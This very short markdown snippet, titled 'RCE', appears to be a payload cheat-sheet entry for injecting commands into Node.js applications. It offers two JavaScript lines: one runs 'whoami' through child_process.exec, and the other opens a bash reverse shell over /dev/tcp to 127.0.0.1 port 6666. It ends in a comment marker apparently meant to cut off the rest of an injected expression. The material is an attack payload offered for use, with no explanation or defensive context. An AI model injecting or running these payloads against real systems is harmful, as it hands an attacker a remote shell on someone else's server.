# RCE

```javascript
require("child_process").exec('whoami');
require("child_process").exec("bash -c \'bash -i>& /dev/tcp/127.0.0.1/6666 0>&1\'");//
```
